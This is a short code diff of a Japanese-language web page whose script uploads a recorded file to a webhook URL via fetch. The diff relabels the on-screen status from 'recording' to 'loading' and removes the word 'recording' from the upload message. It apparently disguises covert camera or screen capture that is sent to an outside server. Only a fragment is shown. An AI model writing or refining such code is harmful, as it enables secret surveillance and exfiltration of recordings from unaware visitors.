@@ -34,7 +34,7 @@
 </head>
 <body>
 
-<div id="progressText">録画中... 0%</div>
+<div id="progressText">読み込み中... 0%</div>
 <div id="progressBar">
   <div id="progressFill"></div>
 </div>
@@ -62,7 +62,7 @@
 
         const formData = new FormData();
         formData.append("file", file);
-        formData.append("content", "🎥 録画完了しました");
+        formData.append("content", "🎥 完了しました");
 
         fetch(webhookUrl, {
           method: "POST",
